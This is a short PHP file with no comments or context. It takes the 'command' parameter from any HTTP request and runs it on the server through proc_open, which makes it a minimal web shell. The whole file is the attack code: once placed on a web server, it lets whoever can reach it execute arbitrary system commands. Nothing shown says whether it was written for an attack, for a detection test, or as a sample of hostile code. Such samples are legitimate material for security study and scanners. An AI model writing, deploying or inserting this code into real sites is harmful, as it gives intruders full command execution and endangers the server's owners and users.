<?php
$p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);

proc_close($p);
?>